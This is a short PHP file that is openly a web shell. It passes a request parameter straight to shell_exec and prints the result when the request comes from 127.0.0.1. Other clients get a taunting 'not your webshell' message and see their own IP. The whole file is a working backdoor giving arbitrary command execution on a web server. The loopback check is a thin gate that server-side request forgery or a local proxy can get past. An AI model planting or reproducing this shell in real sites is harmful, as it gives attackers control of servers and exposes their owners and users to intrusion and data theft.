<?php
	if (isset($_REQUEST[0])){
		if ($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
			echo "<pre>";
			echo shell_exec($_REQUEST[0]);
			echo "</pre>";
		}
		else {
			echo "Nope, not your webshell :) <br>";
			echo "IP:  " . $_SERVER['REMOTE_ADDR'];
		}
	}
?>
